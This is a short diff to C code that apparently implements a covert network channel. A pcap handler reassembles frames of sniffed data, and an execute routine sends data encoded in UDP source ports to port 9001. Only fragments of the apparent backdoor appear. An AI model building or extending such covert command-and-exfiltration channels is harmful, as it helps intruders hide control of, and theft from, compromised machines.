@@ -91,12 +91,15 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 	++ptr;
 
 	// Step 3: dump data into buffer
-//	dec = decrypt(SEKRET, ptr, FRAM_SZ);
 	data = buf + len;
 	memcpy(data, ptr, 1);
-//	free(dec);
-
 	len += 1;
+
+	if (len % FRAM_SZ != 0) // Check for frame
+		return;
+
+	//	dec = decrypt(SEKRET, ptr, FRAM_SZ);
+	//	free(dec);
 
 	// Step 4: see if we have a full transmission
 	data = getTransmission(buf, &len, &type);
@@ -172,8 +175,8 @@ void execute(char *command, u_int32_t ip, u_int16_t port)
 			src_port += byte;
 			dst_port = 9001;
 
-			_send(ip, src_port, dst_port, CHAN_UDP);
 			usleep(SLEEP_TIME);
+			_send(ip, src_port, dst_port, CHAN_UDP);
 		}
 		//			free(enc);
 	}
